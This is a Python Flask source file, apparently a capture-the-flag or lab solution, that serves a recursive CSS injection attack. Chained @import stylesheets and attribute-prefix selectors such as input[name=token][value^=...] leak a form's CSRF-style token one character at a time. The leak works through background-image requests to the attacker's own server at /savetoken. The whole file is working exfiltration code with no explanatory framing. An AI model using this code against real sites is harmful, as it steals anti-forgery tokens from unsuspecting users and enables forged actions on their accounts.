import time

from flask import Flask, request, render_template
from flask import Response

app = Flask(__name__, static_url_path="", static_folder="static", template_folder="")

our_ip = '172.26.0.1'
our_url = 'http://'+our_ip+':9000/'

ip = 'localhost'
# ip = '172.26.0.2'

chars = '0123456789abcdef'
token = ""

# sem = threading.Semaphore()

@app.route("/")
def index():
    global token
    return render_template("whitelist.html", token=token, addr=our_ip, ip=ip)

@app.route("/gettoken")
def gettoken():
    global token
    return token


@app.route("/savetoken")
def savetoken():
    global token
    global chars

    token_received = request.args.get("token")
    print(token_received)
    if token_received is not None:
        if len(token_received) > len(token):
            token = token_received

    return ""


@app.route("/gethack.css")
def get_hack_css():
    response = ''

    for char in chars:
        # 'input[name=csrf][value^="%s"]{ background-image: url("http://localhost:9000/savetoken?token=%s"); } \n'
        response += ('#newWhitelistForm > input[name=token][value^="%s"] {display: block !important; background: url("'+our_url+'savetoken?token=%s"); }\n') % (
            token + char, token + char)

    return Response(response, mimetype='text/css')


@app.route("/get.css")
def get_css():
    global token
    global chars

    char_index = int(request.args.get("i"))
    response = ''

    #
    # Holding only one connection at a time
    #

    while len(token) < (char_index - 1):
        time.sleep(.1)
    response += '@import url("'+our_url+'gethack.css?i=' + str(char_index) + '");\n'
    response += '@import url("'+our_url+'get.css?i=' + str(char_index + 1) + '");\n'


    #
    # Without holding any connection ever
    #

    # if len(token) < (char_index - 1):
    #     time.sleep(.1)
    #     response += '@import url("http://localhost:9000/get.css?i=' + str(char_index) + '&'+str(random.getrandbits(16))+'");\n'
    # else:
    #     response += '@import url("http://localhost:9000/gethack.css?i=' + str(char_index) + '");\n'
    #     response += '@import url("http://localhost:9000/get.css?i=' + str(char_index + 1) + '");\n'

    return Response(response, mimetype='text/css')


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=9000)
